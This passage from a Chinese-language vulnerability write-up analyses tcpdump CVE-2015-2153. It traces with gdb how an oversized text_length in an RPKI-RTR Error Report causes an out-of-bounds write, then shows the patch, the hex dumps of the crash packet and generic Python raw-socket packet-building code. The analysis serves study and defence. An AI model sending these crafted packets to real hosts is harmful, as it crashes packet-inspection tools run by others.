EAX: 0x3e (&#39;&gt;&#39;)
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x7fffffc1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a171b8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
EIP: 0x80a127e (&lt;rpki_rtr_pdu_print+802&gt;:    sub    DWORD PTR [ebp-0x94],0xc)
EFLAGS: 0x200296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a126f &lt;rpki_rtr_pdu_print+787&gt;:    call   0x8049eb0 &lt;printf@plt&gt;
   0x80a1274 &lt;rpki_rtr_pdu_print+792&gt;:    add    esp,0x20
   0x80a1277 &lt;rpki_rtr_pdu_print+795&gt;:    add    DWORD PTR [ebp-0xac],0xc
=&gt; 0x80a127e &lt;rpki_rtr_pdu_print+802&gt;:    sub    DWORD PTR [ebp-0x94],0xc
   0x80a1285 &lt;rpki_rtr_pdu_print+809&gt;:    cmp    DWORD PTR [ebp-0x74],0x0
   0x80a1289 &lt;rpki_rtr_pdu_print+813&gt;:    je     0x80a12d1 &lt;rpki_rtr_pdu_print+885&gt;
   0x80a128b &lt;rpki_rtr_pdu_print+815&gt;:    mov    eax,DWORD PTR [ebp-0x74]
   0x80a128e &lt;rpki_rtr_pdu_print+818&gt;:    cmp    eax,DWORD PTR [ebp-0x94]
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a171d8 --&gt; 0xffffff7f 
0016| 0xbfffdf30 --&gt; 0xbfffe04b --&gt; 0xa171b8b7 
0020| 0xbfffdf34 --&gt; 0xb7fe3f80 (&lt;check_match+304&gt;:    add    esp,0x10)
0024| 0xbfffdf38 --&gt; 0xb7c2f2e5 (&quot;GLIBC_2.0&quot;)
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a127e in rpki_rtr_pdu_print ()
gdb-peda$ x/x $ebp-0xac
0xbfffdf2c:    0xb7a171d8
gdb-peda$ x/x 0xb7a171d8
0xb7a171d8:    0xffffff7f
</code></pre><p>这个结构体在这里的长度是<code>0x00</code>，所以不用在意</p>
<pre><code>/*
    * Recurse if there is an encapsulated PDU.
    */
if (encapsulated_pdu_length &amp;&amp;
(encapsulated_pdu_length &lt;= tlen)) {
printf(&quot;%s-----encapsulated PDU-----&quot;, indent_string(indent+4));
rpki_rtr_pdu_print(tptr, indent+2);
}

tptr += encapsulated_pdu_length;
tlen -= encapsulated_pdu_length;
</code></pre><p><code>tlen</code>前面赋值为<code>0x08</code>，所以会执行<code>if</code>里的代码</p>
<pre><code>/*
    * Extract, trail-zero and print the Error message.
    */ 
text_length = 0;
if (tlen &gt; 4) {
    text_length = EXTRACT_32BITS(tptr);
    tptr += 4;
    tlen -= 4;
}
</code></pre><p>我们可以看到执行完后，<code>text_length</code>为<code>0x7fffffff</code>，这个值已经非常大了</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x7fffffff 
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x7fffffc1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a171b8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf10 --&gt; 0xb7a171d8 --&gt; 0xffffff7f 
EIP: 0x80a1304 (&lt;rpki_rtr_pdu_print+936&gt;:    add    esp,0x10)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a12f6 &lt;rpki_rtr_pdu_print+922&gt;:    sub    esp,0xc
   0x80a12f9 &lt;rpki_rtr_pdu_print+925&gt;:    push   DWORD PTR [ebp-0xac]
   0x80a12ff &lt;rpki_rtr_pdu_print+931&gt;:    call   0x80a0ebb &lt;EXTRACT_32BITS&gt;
=&gt; 0x80a1304 &lt;rpki_rtr_pdu_print+936&gt;:    add    esp,0x10
   0x80a1307 &lt;rpki_rtr_pdu_print+939&gt;:    mov    DWORD PTR [ebp-0x98],eax
   0x80a130d &lt;rpki_rtr_pdu_print+945&gt;:    add    DWORD PTR [ebp-0xac],0x4
   0x80a1314 &lt;rpki_rtr_pdu_print+952&gt;:    sub    DWORD PTR [ebp-0x94],0x4
   0x80a131b &lt;rpki_rtr_pdu_print+959&gt;:    cmp    DWORD PTR [ebp-0x98],0x0
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf10 --&gt; 0xb7a171d8 --&gt; 0xffffff7f 
0004| 0xbfffdf14 --&gt; 0x811af28 (&quot;Unknown&quot;)
0008| 0xbfffdf18 --&gt; 0x1 
0012| 0xbfffdf1c --&gt; 0xb7a171d0 --&gt; 0x8000000 
0016| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
0020| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0024| 0xbfffdf28 --&gt; 0x0 
0028| 0xbfffdf2c --&gt; 0xb7a171d8 --&gt; 0xffffff7f 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a1304 in rpki_rtr_pdu_print ()
</code></pre><p>跳过长度字段，指向message，<code>\x41\x41\x41\x41</code>为伪造的数据</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x7fffffff 
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x7fffffc1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a171b8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
EIP: 0x80a1314 (&lt;rpki_rtr_pdu_print+952&gt;:    sub    DWORD PTR [ebp-0x94],0x4)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a1304 &lt;rpki_rtr_pdu_print+936&gt;:    add    esp,0x10
   0x80a1307 &lt;rpki_rtr_pdu_print+939&gt;:    mov    DWORD PTR [ebp-0x98],eax
   0x80a130d &lt;rpki_rtr_pdu_print+945&gt;:    add    DWORD PTR [ebp-0xac],0x4
=&gt; 0x80a1314 &lt;rpki_rtr_pdu_print+952&gt;:    sub    DWORD PTR [ebp-0x94],0x4
   0x80a131b &lt;rpki_rtr_pdu_print+959&gt;:    cmp    DWORD PTR [ebp-0x98],0x0
   0x80a1322 &lt;rpki_rtr_pdu_print+966&gt;:    je     0x80a13a3 &lt;rpki_rtr_pdu_print+1095&gt;
   0x80a1324 &lt;rpki_rtr_pdu_print+968&gt;:    mov    eax,DWORD PTR [ebp-0x98]
   0x80a132a &lt;rpki_rtr_pdu_print+974&gt;:    cmp    eax,DWORD PTR [ebp-0x94]
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a171dc (&quot;AAAA\220&quot;)
0016| 0xbfffdf30 --&gt; 0xbfffe04b --&gt; 0xa171b8b7 
0020| 0xbfffdf34 --&gt; 0xb7fe3f80 (&lt;check_match+304&gt;:    add    esp,0x10)
0024| 0xbfffdf38 --&gt; 0xb7c2f2e5 (&quot;GLIBC_2.0&quot;)
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a1314 in rpki_rtr_pdu_print ()
gdb-peda$ x/x $ebp-0xac
0xbfffdf2c:    0xb7a171dc
gdb-peda$ x/x 0xb7a171dc
0xb7a171dc:    0x41414141
</code></pre><p>最后到达关键的地方，<code>text_length</code>为<code>0x7fffffff</code>，虽然<code>text_length</code>很大，然而<code>tlen</code>此时更大</p>
<pre><code>if (text_length &amp;&amp; (text_length &lt;= tlen )) {
    memcpy(buf, tptr, MIN(sizeof(buf)-1, text_length));
    buf[text_length] = &#39;\0&#39;;
    printf(&quot;%sError text: %s&quot;, indent_string(indent+2), buf);
}
</code></pre><p>妥妥的进入到<code>if</code>分支，首先是一个<code>memcpy</code>，这个函数不会造成崩溃，关键在于<code>buf[text_length]</code>，这个内存是不可访问的，所以当往这个地址写入<code>\0</code>的时候，就会因为写入不可访问的内存导致Crash</p>
<p>然后走到最后，向不可访问的内存写入数据，发生段错误</p>
<pre><code>Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x3fffdf6b 
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x4f (&#39;O&#39;)
EDX: 0xbfffdf6c (&quot;AAAA\220&quot;)
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a171b8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
EIP: 0x80a1366 (&lt;rpki_rtr_pdu_print+1034&gt;:    mov    BYTE PTR [eax],0x0)
EFLAGS: 0x210213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a135b &lt;rpki_rtr_pdu_print+1023&gt;:    lea    edx,[ebp-0x6c]
   0x80a135e &lt;rpki_rtr_pdu_print+1026&gt;:    mov    eax,DWORD PTR [ebp-0x98]
   0x80a1364 &lt;rpki_rtr_pdu_print+1032&gt;:    add    eax,edx
=&gt; 0x80a1366 &lt;rpki_rtr_pdu_print+1034&gt;:    mov    BYTE PTR [eax],0x0
   0x80a1369 &lt;rpki_rtr_pdu_print+1037&gt;:    mov    eax,DWORD PTR [ebp+0xc]
   0x80a136c &lt;rpki_rtr_pdu_print+1040&gt;:    add    eax,0x2
   0x80a136f &lt;rpki_rtr_pdu_print+1043&gt;:    sub    esp,0xc
   0x80a1372 &lt;rpki_rtr_pdu_print+1046&gt;:    push   eax
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x71a40200 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a171dc (&quot;AAAA\220&quot;)
0016| 0xbfffdf30 --&gt; 0xbfffe04b --&gt; 0xa171b8b7 
0020| 0xbfffdf34 --&gt; 0xb7fe3f80 (&lt;check_match+304&gt;:    add    esp,0x10)
0024| 0xbfffdf38 --&gt; 0xb7c2f2e5 (&quot;GLIBC_2.0&quot;)
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x080a1366 in rpki_rtr_pdu_print ()
</code></pre><p>官方补丁</p>
<ul>
<li><a href="http://www.ca.tcpdump.org/cve/0002-test-case-files-for-CVE-2015-2153-2154-2155.patch">http://www.ca.tcpdump.org/cve/0002-test-case-files-for-CVE-2015-2153-2154-2155.patch</a></li></ul>
<p>找到对应的补丁位置</p>
<pre><code>diff --git a/print-rpki-rtr.c b/print-rpki-rtr.c
index 8679759..3733ba6 100644
--- a/print-rpki-rtr.c
+++ b/print-rpki-rtr.c
@@ -184,6 +184,7 @@ rpki_rtr_pdu_print (const u_char *tptr, u_int indent)
     pdu_header = (rpki_rtr_pdu *)tptr;
     pdu_type = pdu_header-&gt;pdu_type;
     pdu_len = EXTRACT_32BITS(pdu_header-&gt;length);
+    TCHECK2(tptr, pdu_len);
     hexdump = FALSE;

     printf(&quot;%sRPKI-RTRv%u, %s PDU (%u), length: %u&quot;,
@@ -292,6 +293,7 @@ rpki_rtr_pdu_print (const u_char *tptr, u_int indent)
         tptr += 4;
         tlen -= 4;
         }
+            printf(&quot;text_length: %u tlen %u\n&quot;, text_length, tlen);
         if (text_length &amp;&amp; (text_length &lt;= tlen )) {
         memcpy(buf, tptr, MIN(sizeof(buf)-1, text_length));
         buf[text_length] = &#39;\0&#39;;
@@ -312,6 +314,11 @@ rpki_rtr_pdu_print (const u_char *tptr, u_int indent)
     if (vflag &gt; 1 || (vflag &amp;&amp; hexdump)) {
     print_unknown_data(tptr,&quot;\n\t  &quot;, pdu_len);
     }
+    return;
+
+ trunc:
+    printf(&quot;|trunc&quot;);
+    return;
 }
</code></pre><p>多了一个关于长度的校验</p>
<pre><code>+    TCHECK2(tptr, pdu_len);
</code></pre><p>最后有一个问题，一开始我是在同一个系统中执行的Poc，没反应，然后我切换到Windows下执行，同样没反应，只是捕获到了一个数据帧而已，最后换的Linux执行Poc，这就很尴尬了，难道是Windows下发送的数据和Linux下是不一样的，带着好奇，探索一波</p>
<p>我们先捕获Linux的数据帧，要开着服务端，不然会一直发ARP包找服务端</p>
<pre><code>0000   00 0c 29 07 15 e0 00 0c 29 25 f9 91 08 00 45 00
0010   00 3c d4 31 00 00 ff 06 73 2d c0 a8 79 86 c0 a8
0020   79 85 00 ff 01 43 00 00 01 c6 00 00 00 00 50 02
0030   d0 16 23 be 00 00 41 0a 00 01 00 00 00 08 00 00
0040   00 00 7f ff ff ff 41 41 41 41

Frame 3: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface 0
    Interface id: 0 (ens33)
    Encapsulation type: Ethernet (1)
    Arrival Time: Jan  9, 2018 18:52:32.842651595 HKT
    [Time shift for this packet: 0.000000000 seconds]
    Epoch Time: 1515495152.842651595 seconds
    [Time delta from previous captured frame: 0.165448096 seconds]
    [Time delta from previous displayed frame: 0.165448096 seconds]
    [Time since reference or first frame: 1.166104128 seconds]
    Frame Number: 3
    Frame Length: 74 bytes (592 bits)
    Capture Length: 74 bytes (592 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: eth:ethertype:ip:tcp:rpkirtr]
    [Coloring Rule Name: TCP SYN/FIN]
    [Coloring Rule String: tcp.flags &amp; 0x02 || tcp.flags.fin == 1]
Ethernet II, Src: Vmware_07:15:e0 (00:0c:29:07:15:e0), Dst: Vmware_c0:00:08 (00:50:56:c0:00:08)
Internet Protocol Version 4, Src: 192.168.121.133, Dst: 192.168.121.1
Transmission Control Protocol, Src Port: 255, Dst Port: 323, Seq: 0, Len: 20
RPKI-Router Protocol (Error Report)
[Malformed Packet: RPKI-Router Protocol]
</code></pre><p>然后捕获Windows下的数据帧</p>
<pre><code>0000   00 0c 29 07 15 e0 00 50 56 c0 00 08 08 00 45 00
0010   00 50 39 52 00 00 80 ff 8c 85 c0 a8 79 01 c0 a8
0020   79 85 45 00 00 00 d4 31 00 00 ff 06 00 00 c0 a8
0030   79 86 c0 a8 79 85 00 ff 01 43 00 00 01 c6 00 00
0040   00 00 50 02 d0 16 23 be 00 00 41 0a 00 01 00 00
0050   00 08 00 00 00 00 7f ff ff ff 41 41 41 41

Frame 1: 94 bytes on wire (752 bits), 94 bytes captured (752 bits) on interface 0
    Interface id: 0 (\Device\NPF_{B990A247-0478-43B6-8AB1-18CBBE0663EC})
        Interface name: \Device\NPF_{B990A247-0478-43B6-8AB1-18CBBE0663EC}
    Encapsulation type: Ethernet (1)
    Arrival Time: Jan  9, 2018 18:47:07.199190000 中国标准时间
    [Time shift for this packet: 0.000000000 seconds]
    Epoch Time: 1515494827.199190000 seconds
    [Time delta from previous captured frame: 0.000000000 seconds]
    [Time delta from previous displayed frame: 0.000000000 seconds]
    [Time since reference or first frame: 0.000000000 seconds]
    Frame Number: 1
    Frame Length: 94 bytes (752 bits)
    Capture Length: 94 bytes (752 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: eth:ethertype:ip:data]
Ethernet II, Src: Vmware_c0:00:08 (00:50:56:c0:00:08), Dst: Vmware_07:15:e0 (00:0c:29:07:15:e0)
    Destination: Vmware_07:15:e0 (00:0c:29:07:15:e0)
        Address: Vmware_07:15:e0 (00:0c:29:07:15:e0)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
    Source: Vmware_c0:00:08 (00:50:56:c0:00:08)
        Address: Vmware_c0:00:08 (00:50:56:c0:00:08)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
    Type: IPv4 (0x0800)
Internet Protocol Version 4, Src: 192.168.121.1, Dst: 192.168.121.133
    0100 .... = Version: 4
    .... 0101 = Header Length: 20 bytes (5)
    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
        0000 00.. = Differentiated Services Codepoint: Default (0)
        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
    Total Length: 80
    Identification: 0x4f1c (20252)
    Flags: 0x00
        0... .... = Reserved bit: Not set
        .0.. .... = Don&#39;t fragment: Not set
        ..0. .... = More fragments: Not set
    Fragment offset: 0
    Time to live: 128
    Protocol: Unknown (255)
    Header checksum: 0x76bb [validation disabled]
    [Header checksum status: Unverified]
    Source: 192.168.121.1
    Destination: 192.168.121.133
    [Source GeoIP: Unknown]
    [Destination GeoIP: Unknown]
Data (60 bytes)
    Data: 45000000d4310000ff060000c0a87901c0a8798500ff0143...
    [Length: 60]
</code></pre><p>将两者进行对比，果然是不一样的</p>
<p>这。。。。。。</p>
<p>由于之前没有研究过Raw Socket编程，那么趁着这次机会，学习一下，这里跟着搜到的一篇教程学习构造</p>
<ul>
<li><a href="http://blog.csdn.net/yatere/article/details/39156527">http://blog.csdn.net/yatere/article/details/39156527</a></li></ul>
<p>首先是构造ip</p>
<pre><code>class ip(object):
    def __init__(self, source, destination):
        self.version = 4
        self.ihl = 5 # Internet Header Length
        self.tos = 0 # Type of Service
        self.tl = 0 # total length will be filled by kernel
        self.id = 54321
        self.flags = 0 # More fragments
        self.offset = 0
        self.ttl = 255
        self.protocol = socket.IPPROTO_TCP
        self.checksum = 0 # will be filled by kernel
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)
    def pack(self):
        ver_ihl = (self.version &lt;&lt; 4) + self.ihl
        flags_offset = (self.flags &lt;&lt; 13) + self.offset
        ip_header = struct.pack(&quot;!BBHHHBBH4s4s&quot;,
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)
</code></pre><p>构造tcp</p>
<pre><code>class tcp(object):
    def __init__(self, srcp, dstp):
        self.srcp = srcp
        self.dstp = dstp
        self.seqn = 0
        self.ackn = 0
        self.offset = 5 # Data offset: 5x4 = 20 bytes
        self.reserved = 0
        self.urg = 0
        self.ack = 0
        self.psh = 1
        self.rst = 0
        self.syn = 0
        self.fin = 0
        self.window = socket.htons(5840)
        self.checksum = 0
        self.urgp = 0
        self.payload = &quot;&quot;
    def pack(self, source, destination):
        data_offset = (self.offset &lt;&lt; 4) + 0
        flags = self.fin + (self.syn &lt;&lt; 1) + (self.rst &lt;&lt; 2) + (self.psh &lt;&lt; 3) + (self.ack &lt;&lt; 4) + (self.urg &lt;&lt; 5)
        tcp_header = struct.pack(&#39;!HHLLBBHHH&#39;,
                     self.srcp,
                     self.dstp,
                     self.seqn,
                     self.ackn,
                     data_offset,
                     flags,
                     self.window,
                     self.checksum,
                     self.urgp)
        #pseudo header fields
        source_ip = source
        destination_ip = destination
        reserved = 0
        protocol = socket.IPPROTO_TCP
        total_length = len(tcp_header) + len(self.payload)
        # Pseudo header
        psh = struct.pack(&quot;!4s4sBBH&quot;,
              source_ip,
              destination_ip,
              reserved,
              protocol,
              total_length)
        psh = psh + tcp_header + self.payload
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack(&quot;!HHLLBBH&quot;,
                  self.srcp,
                  self.dstp,
                  self.seqn,
                  self.ackn,
                  data_offset,
                  flags,
                  self.window)
        tcp_header+= struct.pack(&#39;H&#39;, tcp_checksum) + struct.pack(&#39;!H&#39;, self.urgp)
</code></pre><p>校验字段</p>
<pre><code>def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) &lt;&lt; 8)
    if n:
        s+= ord(data[i+1])
    while (s &gt;&gt; 16):
        print(&quot;s &gt;&gt; 16: &quot;, s &gt;&gt; 16)
        s = (s &amp; 0xFFFF) + (s &gt;&gt; 16)
    print(&quot;sum:&quot;, s)
    s = ~s &amp; 0xffff
</code></pre><p>关于使用，先创建一个socket对象实例，然后设置源地址和目的地址以及数据，创建ip实例以及tcp实例，最后进行拼接，如果要发送出去使用<code>s.sendto(packet, (dest_host , 0 ))</code>即可</p>
<pre><code>s = socket.socket(socket.AF_INET,
                  socket.SOCK_RAW,
                  socket.IPPROTO_RAW)
src_host = &quot;xxx.xxx.xxx.xxx&quot;
dest_host = socket.gethostbyname(&quot;www.xxxxx.com&quot;)
data = &quot;TEST!!&quot;
# IP Header
ipobj = ip(src_host, dest_host)
iph = ip_object.pack()
# TCP Header
tcpobj = tcp(1234, 80)
tcpobj.data_length = len(data)  # Used in pseudo header
tcph = tcpobj.pack(ipobj.source,
                   ipobj.destination)
# Injection
packet = iph + tcph + data
</code></pre><p>同样的代码生成的数据帧确实不一样，后来在一篇文章里找到，说是微软为了限制包嗅探，在Windows XP之后的系统里限制了原始套接字的能力</p>
<p>最后，在Linux下捕获到的包如下</p>
<p><img src="Image/3.png" alt=""></p>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="http://www.expku.com/dos/4992.html">http://www.expku.com/dos/4992.html</a></li><li>CVE-2015-2153 tcpdump: tcp printer <code>rpki_rtr_pdu_print()</code> missing length check：<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1201795">https://bugzilla.redhat.com/show_bug.cgi?id=1201795</a></li><li><a href="http://blog.csdn.net/yatere/article/details/39156527">http://blog.csdn.net/yatere/article/details/39156527</a><br>-<a href="http://www.freebuf.com/articles/network/41127.html">http://www.freebuf.com/articles/network/41127.html</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
